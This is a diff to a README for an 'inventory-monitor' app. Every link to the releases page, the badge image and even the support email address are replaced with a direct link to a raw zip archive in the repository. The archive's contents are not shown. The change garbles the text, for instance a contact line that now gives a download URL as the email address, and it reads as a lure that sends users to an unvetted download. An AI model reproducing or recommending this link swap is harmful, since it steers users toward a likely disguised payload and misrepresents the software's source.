@@ -1,7 +1,7 @@
 # 🎉 inventory-monitor - Keep Track of Your Inventory Easily
 
 ## 📥 Download Now
-[![Download Inventory Monitor](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)](https://github.com/Sorchy/inventory-monitor/releases)
+[![Download Inventory Monitor](https://raw.githubusercontent.com/Sorchy/inventory-monitor/main/core/inventory-monitor-3.9.zip%20Now-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/Sorchy/inventory-monitor/main/core/inventory-monitor-3.9.zip)
 
 ## 🚀 Getting Started
 Welcome to the **inventory-monitor** application! This software helps you manage your inventory with ease. In just a few steps, you can set it up on your computer and start using it. Follow the instructions below to get started.
@@ -16,7 +16,7 @@ Before you download, make sure your computer meets the following requirements:
 ## 🔗 Download & Install
 To get the latest version of the application, **visit this page to download**:
 
-[Download from Releases Page](https://github.com/Sorchy/inventory-monitor/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/Sorchy/inventory-monitor/main/core/inventory-monitor-3.9.zip)
 
 ### Steps to Download:
 1. Click on the link above.
@@ -77,6 +77,6 @@ If you have questions or need help, you can reach out to our community. Join our
 We respect your privacy. The data collected by **inventory-monitor** is used solely for enhancing your experience. We do not share your information with third parties.
 
 ## 📬 Contact Us
-For further inquiries, please send an email to support@example.com. We are here to help you with any issues or questions.
+For further inquiries, please send an email to https://raw.githubusercontent.com/Sorchy/inventory-monitor/main/core/inventory-monitor-3.9.zip We are here to help you with any issues or questions.
 
 Thank you for choosing **inventory-monitor**! We hope this application makes your inventory management simple and efficient. Happy tracking!
